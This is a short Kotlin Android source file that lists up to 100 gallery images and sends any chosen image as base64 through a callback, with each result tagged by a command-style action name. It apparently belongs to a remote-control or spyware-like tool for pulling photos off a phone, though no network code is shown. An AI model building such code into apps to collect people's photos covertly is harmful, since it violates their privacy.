package com.app.cyber

import android.content.ContentUris
import android.content.Context
import android.provider.MediaStore
import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject

object GalleryRechive {
    fun listImages(ctx: Context, emit: (JSONObject) -> Unit) {
        val result = JSONArray()
        val cursor = ctx.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME),
            null, null,
            MediaStore.Images.Media.DATE_ADDED + " DESC"
        )
        
        cursor?.use {
            val idCol = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            while (it.moveToNext() && result.length() < 100) {
                val obj = JSONObject()
                obj.put("id", it.getLong(idCol))
                obj.put("name", it.getString(nameCol) ?: "image.jpg")
                result.put(obj)
            }
        }
        
        val payload = JSONObject()
        payload.put("action", "gallery_list")
        payload.put("data", result)
        emit(payload)
    }

    fun sendImage(ctx: Context, idStr: String, emit: (JSONObject) -> Unit) {
        try {
            val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, idStr.toLongOrNull() ?: return)
            val input = ctx.contentResolver.openInputStream(uri) ?: return
            val bytes = input.readBytes()
            input.close()
            
            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
            
            val payload = JSONObject()
            payload.put("action", "gallery_get")
            payload.put("id", idStr)
            payload.put("data", base64)
            emit(payload)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
